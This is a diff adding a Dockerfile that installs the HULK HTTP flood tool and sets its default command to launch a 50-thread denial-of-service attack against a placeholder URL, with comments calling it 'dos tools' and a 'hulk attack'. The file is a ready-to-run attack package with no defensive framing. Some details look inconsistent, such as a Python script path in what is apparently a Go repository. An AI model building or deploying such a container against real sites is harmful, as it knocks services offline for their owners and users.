@@ -1,0 +1,20 @@
+FROM ubuntu:latest
+
+# Install dos tools
+RUN apt-get update -y
+RUN apt-get install git -y
+RUN apt-get install python-pip -y
+
+# Clone hulk
+RUN git clone https://github.com/grafov/hulk.git
+
+# Create script file
+RUN echo '#!/bin/bash' > /script.sh
+RUN echo 'HULK_URL=http://www.example.com' >> /script.sh
+RUN echo 'THREADS=50' >> /script.sh
+RUN echo 'TIMEOUT=10' >> /script.sh
+RUN echo 'python hulk/hulk.py $HULK_URL -t $THREADS -T $TIMEOUT' >> /script.sh
+
+# Run hulk attack
+CMD ["bash", "/script.sh"]
+
